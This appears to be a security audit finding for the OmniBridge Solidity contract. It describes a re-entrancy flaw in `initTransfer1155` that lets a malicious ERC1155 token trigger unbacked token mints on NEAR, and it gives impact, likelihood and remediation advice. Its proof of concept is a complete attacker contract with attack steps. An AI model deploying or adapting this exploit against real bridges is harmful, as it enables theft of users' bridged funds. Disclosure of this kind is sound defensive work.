### Title
Re-Entrancy in `initTransfer1155` via Malicious ERC1155 Callback Enables Unbacked Mint on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` makes an external call to an attacker-controlled ERC1155 contract via `safeTransferFrom` before the function completes. Because ERC1155's `safeTransferFrom` triggers `onERC1155Received` on the recipient (the bridge itself), and because the bridge's `onERC1155Received` guard only blocks direct sends (not re-entrant calls from within `initTransfer1155`), a malicious ERC1155 can re-enter `initTransfer1155` repeatedly during the `safeTransferFrom` call. Each re-entrant invocation increments `currentOriginNonce` and emits a valid `InitTransfer` event — without any tokens ever being locked. The NEAR side treats every emitted `InitTransfer` event as proof of a locked deposit and mints the corresponding bridged tokens, resulting in unbacked supply.

---

### Finding Description

`initTransfer1155` in `OmniBridge.sol` follows this execution order:

1. Increment `currentOriginNonce` (line 448)
2. Call `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458) — **external call to attacker-controlled contract**
3. Emit `InitTransfer` (line 480) [1](#0-0) 

The ERC1155 standard requires `safeTransferFrom` to call `onERC1155Received` on the recipient when it is a contract. The bridge implements `IERC1155Receiver` and its hook is:

```solidity
function onERC1155Received(address operator, ...) external view override returns (bytes4) {
    if (operator != address(this)) revert ERC1155DirectSendNotAllowed();
    return this.onERC1155Received.selector;
}
``` [2](#0-1) 

This guard only blocks direct sends where `operator != bridge`. When `initTransfer1155` calls `safeTransferFrom`, the operator **is** the bridge, so the check passes. Critically, this guard does **not** prevent a malicious ERC1155 from re-entering `initTransfer1155` from within its own `safeTransferFrom` implementation.

There is no `nonReentrant` modifier anywhere in the EVM contracts: [3](#0-2) 

The CLAUDE.md documents the intended defense as "state before external calls" (nonce incremented first), but this only prevents nonce reuse — it does not prevent multiple distinct nonces from being minted in a single transaction with zero tokens locked. [4](#0-3) 

There is no whitelist check on `tokenAddress` in `initTransfer1155` — any address is accepted.

---

### Impact Explanation

**Critical — unauthorized mint of bridged assets.**

The NEAR side's only evidence that tokens are locked on EVM is the `InitTransfer` event. The NEAR bridge processes each event by its unique `originNonce` and mints the corresponding amount to the specified NEAR recipient. [5](#0-4) 

An attacker can emit K `InitTransfer` events (nonces 1…K), each claiming `amount` tokens, while locking zero tokens. NEAR mints K × `amount` unbacked bridged tokens. The attacker can then bridge these back or sell them, draining real assets from the NEAR-side pool.

This directly violates the documented invariant:

> **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. [6](#0-5) 

---

### Likelihood Explanation

**High.** The attack requires no privileged role, no leaked key, and no colluding party. Any user can:

1. Deploy a malicious ERC1155 contract (trivial, no admin approval needed).
2. Call `initTransfer1155` with that contract as `tokenAddress`.
3. The malicious ERC1155's `safeTransferFrom` re-enters `initTransfer1155` as many times as desired.

The `initTransfer1155` function is fully public and permissionless. [7](#0-6) 

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`. This is the standard defense for this class of vulnerability. The nonce-increment-before-external-call pattern is insufficient alone because it only prevents nonce reuse, not multiple distinct nonces being minted in one transaction.

Alternatively, validate that `tokenAddress` is a registered/whitelisted ERC1155 contract before calling `safeTransferFrom`, preventing attacker-controlled token contracts from being used as the re-entrancy vector.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 5;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by OmniBridge.initTransfer1155
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        // Re-enter initTransfer1155 before returning
        if (reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount), 0, 0, "attacker.near", ""
            );
        }
        // Call onERC1155Received on bridge so it doesn't revert
        // operator = bridge (msg.sender here), so the guard passes
        IERC1155Receiver(msg.sender).onERC1155Received(
            msg.sender, address(this), tokenId, amount, ""
        );
        // No actual token transfer — bridge balance stays 0
    }

    // Needed to satisfy IERC1155 interface checks
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. Call bridge.initTransfer1155(maliciousERC1155, 1, 1000e18, 0, 0, "attacker.near", "")
// 3. Result: 6 InitTransfer events emitted (nonces 1-6), each for 1000e18 tokens
//    Bridge holds 0 ERC1155 tokens
//    NEAR mints 6000e18 unbacked tokens to attacker.near
``` [8](#0-7)

**EVM → NEAR (initTransfer)**: User calls `initTransfer` which burns/locks tokens on EVM and emits `InitTransfer` with all transfer details (sender, token, amount, fee, nativeFee, recipient, message). In the Wormhole variant, a Wormhole message is also sent. The NEAR side reads this event (via light client or Wormhole) to complete the transfer. Every field needed to reconstruct the transfer must be in the event — it is the only data the NEAR side sees.

- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
- **No token release without signature**: Never mint, transfer, or unlock tokens to a recipient without first verifying a valid MPC signature. No admin function, emergency path, or refactor may bypass this — it is the only authorization gate for finTransfer
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
